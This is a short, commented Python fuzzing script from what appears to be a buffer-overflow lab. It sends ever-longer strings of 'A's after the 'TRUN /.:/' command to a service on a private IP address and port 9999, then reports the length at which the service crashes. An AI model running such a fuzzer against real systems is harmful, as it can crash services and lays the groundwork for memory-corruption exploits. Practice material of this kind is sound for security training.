#!/usr/bin/python
 
import sys, socket                                                      # import modules to call ip and port
from time import sleep                                                  # import sleep to make the process sleep before trying it all over again
 
buffer = "A" * 100                                                      # buffer variabe with 100 As
 
while True:    
    try:
        payload = "TRUN /.:/" + buffer                                  # this will send buffer to the vulnerable command TRUN
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)           # connect socket to ip and port
        s.connect(('192.168.1.12',9999))
        print ("[+] Sending the payload...\n" + str(len(buffer)))  
        s.send((payload.encode()))                                      # payload sent
        s.close()                                                       # socket closed
        sleep(1)                                                        # process is put to sleep
        buffer = buffer + "A"*100                                       # buffer is incremented 
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))    # displays where it crashed approximately
        sys.exit()
